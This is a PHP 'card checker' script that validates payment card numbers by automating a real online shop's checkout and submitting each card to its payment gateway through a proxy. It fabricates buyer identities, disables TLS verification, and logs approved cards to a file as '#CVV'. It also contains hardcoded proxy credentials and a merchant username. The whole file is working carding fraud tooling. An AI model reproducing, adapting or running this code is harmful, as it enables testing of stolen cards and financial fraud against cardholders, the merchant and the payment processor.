<?php

////////////[2 Curl Template]////////////

error_reporting(1);
set_time_limit(0);
date_default_timezone_set('Asia/Manila');
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");
if(!is_dir(getcwd()."/posty")) mkdir(getcwd()."/posty", 0755);
$posty = getcwd()."/posty/malone".rand(1000000, 99999999).".txt";

///////////////[Functions]///////////////

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function RandomString($length = 5) {
      $characters       = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
}

function emailGenerate($length = 10) {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
}

function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function multi_get_str($string, $start, $end)
{
  $str = explode($start, $string);
  $str1 = explode($end, $str[1])[0];
  $str2 = explode($end, $str[2])[0];
  return "$str1 $str2";
}

extract($_GET);
$card = str_replace(" ", "", $card);
$i     = explode("|", $card);
$cc    = preg_replace("/[^0-9]/", "", $i[0]);
$mm    = preg_replace("/[^0-9]/", "", $i[1]);
$yyyy  = preg_replace("/[^0-9]/", "", $i[2]);
$yy    = substr($yyyy, 2, 4);
$cvv   = preg_replace("/[^0-9]/", "", $i[3]);
$bin   = substr($cc, 0, 6);
$last4 = substr($cc, 12, 16);
$m     = ltrim($mm, "0");
$email = emailGenerate();
$emailencode = urlencode($email);
$name     = RandomString();
$lastname = RandomString();
$last4 = substr($cc, -4);
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, 4);
$cc3 = substr($cc, 8, 4);
$cc4 = substr($cc, 12, 4);

if(substr($cc, 0, 1) == 3) {
  $type = "AE";
} 
 elseif(substr($cc, 0, 1) == 4) {
  $type = "VI";
} 
 elseif(substr($cc, 0, 1) == 5) {
  $type = "MC";
} 
 else{
  $type = "DI";
}

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/products/303/gorras-de-maya'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: none';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/addToCart'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=addToCartNew&pid=303&variationId=328405&attrib_1=4&cantidad=1');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.viarsacr.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/products/304/pano-33x33';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/setMessage'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'storeId=13725&message=%3Cp%3EGracias+por+favorecernos+y+apoyarnos+con+su+compra%3C%2Fp%3E%0A%3Cp%3ENuestros+canales+de+comunicaci%26oacute%3Bn+son%3A%3C%2Fp%3E%0A%3Cp%3EViarsa+Industrial+Textil+S.A%3C%2Fp%3E%0A%3Cp%3ETel%26eacute%3Bfono%3A%26nbsp%3B+4000-3559%3C%2Fp%3E%0A%3Cp%3EWhatsapp%3A%26nbsp%3B+8685+7844%26nbsp%3B+%2F%26nbsp%3B+8685+7844%3C%2Fp%3E%0A%3Cp%3ENuestra+Tienda+est%26aacute%3B+ubicada+en+Tib%26aacute%3Bs.%26nbsp%3B+75+mts+de+Antojitos%2C+diagonal+a+Central+de+Autos%2C+edificio+a+mano+derecha%2C+dos+plantas%2C+r%26oacute%3Btulo+Viarsa%3C%2Fp%3E');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.viarsacr.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/cart';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/checkout'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/cart';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);
$posttoken = GetStr($exe,'name="postToken" value="','"');
$ip = GetStr($exe,'name="BROWSER_IP" value="','"');

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/checkout/checkoutOps'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=getAllSucursales');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.viarsacr.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/checkout';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/checkout/checkoutOps'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=getPickupBranch&ad=1');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.viarsacr.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/checkout';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/checkout/addressSetup'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'role=billing&address_name='.$name.'+'.$lastname.'&address_identification_type=0&address_identification='.rand(0000000000,9999999999).'&address_email='.$emailencode.'&address_tel='.rand(1111111111,9999999999).'&address_country=71&address_province=1227&address_canton=0&address_distrito=0&address_zip=10'.rand(111,999).'&address_city=New+York&lat_input_2=0&lon_input_2=0&address_description='.rand(11111,99999).'+street');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.viarsacr.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/checkout';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/checkout/checkoutOps'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=payment&pa=6');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Origin: https://www.viarsacr.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/checkout';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://www.viarsacr.com/checkout/process'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'postToken='.$posttoken.'&prefix=checkoutForm&anon=1&createCustomer=0&consumer_email='.$emailencode.'&consumer_name='.$name.'+'.$lastname.'&consumer_cel='.rand(1111111111,9999999999).'&consumer_identification_type=0&consumer_identification='.rand(0000000000,9999999999).'&pickupBranchId=1&billingAddressId=1&paymentMethod=6&BROWSER_USER_AGENT=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A98.0%29+Gecko%2F20100101+Firefox%2F98.0&BROWSER_ACCEPT_HEADER=text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0.9%2Cimage%2Favif%2Cimage%2Fwebp%2C*%2F*%3Bq%3D0.8&BROWSER_IP='.$ip.'&BROWSER_LANGUAGE=en-US&BROWSER_SCREEN_HEIGHT=955&BROWSER_SCREEN_WIDTH=1903&BROWSER_TZ=America%2FLos_Angeles&aceptoEula=1');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://www.viarsacr.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/checkout';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);
$hash = GetStr($exe,'name="hash" value="','"');
$time = GetStr($exe,'name="time" value="','"');
$amount = GetStr($exe,'name="amount" value="','"');
$orderid = GetStr($exe,'name="orderid" value="','"');
$key_id = GetStr($exe,'name="key_id" value="','"');
$ipaddress = GetStr($exe,'name="ipaddress" value="','"');

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://credomatic.compassmerchantsolutions.com/api/transact.php'); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'hash='.$hash.'&time='.$time.'&amount='.$amount.'&type=sale&orderid='.$orderid.'&key_id='.$key_id.'&ipaddress='.$ipaddress.'&redirect=https%3A%2F%2Fwww.viarsacr.com%2Freturncc%2F&firstname='.$name.'&lastname='.$lastname.'&ccexp='.$mm.''.$yy.'&ccnumber='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&cvv=');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://www.viarsacr.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.viarsacr.com/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);

$pareq = GetStr($exe,'name="PaReq" value="','"');
$apisid = GetStr($exe,'APISID=','&');
$centinel_transaction_id = GetStr($exe,'centinel_transaction_id=','&');
$cardholder_auth_key = GetStr($exe,'cardholder_auth_key=','"');



$ch = curl_init(); 
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp03340225:Syntaxph');
curl_setopt($ch, CURLOPT_URL, 'https://credomatic.compassmerchantsolutions.com/api/transact.php?username=viarsaadmin08&APISID='.$apisid.'&centinel_transaction_id='.$centinel_transaction_id.'&cardholder_auth_key='.$cardholder_auth_key.''); 
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'PaRes='.urlencode($pares2).'&MD=none');

$headers = array(); 
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://1eaf.cardinalcommerce.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://1eaf.cardinalcommerce.com/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: cross-site';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 

$exe = curl_exec($ch); 
curl_close($ch);
$showexe = htmlentities($exe);
//echo "<b>exe:</b><br>$showexe<br>";

//$response = trim(strip_tags(GetStr($exe,'<div class="checkout-alerts--payment alert alert-danger">','<br />')));
$showresponse = trim(strip_tags(GetStr($exe,'ocation: ',"\n", 1)));
$response = urldecode(GetStr($exe,'&responsetext=','&'));
$success = GetStr($exe,'&authcode=','&');
$retry = 0;
//echo "<b>showresponse:</b><br>$showresponse<br>";
curl_close($ch);
unlink($posty);
////////////////////////////
if(is_numeric($success)) {
  fwrite(fopen('cvv1.txt', 'a'), $card."\r\n");
    echo '<div class="cvvr"><span class="badge badge-outline">#CVV</span> '.$card.' >> Message: '.$response.' [Retries: '.$retry.']</div>';
    exit;
}
elseif(strpos($response,'approved')) {
  fwrite(fopen('cvv1.txt', 'a'), $card."\r\n");
    echo '<div class="cvvr"><span class="badge badge-outline">#CVV</span> '.$card.' >> Message: '.$response.' [Retries: '.$retry.']</div>';
    exit;
}
elseif($response == true) {
    echo '<div class="deadr"><span class="badge badge-outline">#DEAD</span> '.$card.' >> Message: '.$response.' [Retries: '.$retry.']</div>';
    exit;
}else{
  fwrite(fopen('recheck.txt', 'a'), $card."\r\n");
    echo '<div class="deadr"><span class="badge badge-outline">#DEAD</span> '.$card.' >> Message: '.$showexe.' [Retries: '.$retry.']</div>';
    exit;
}
////////////////////////////////////////

ob_flush();
//////////////[Echo Result]///////////
//echo $result;

///////////////////////////////////////////////===========================Edited By Syntax================================================\\\\\\\\\\\\\\\
?>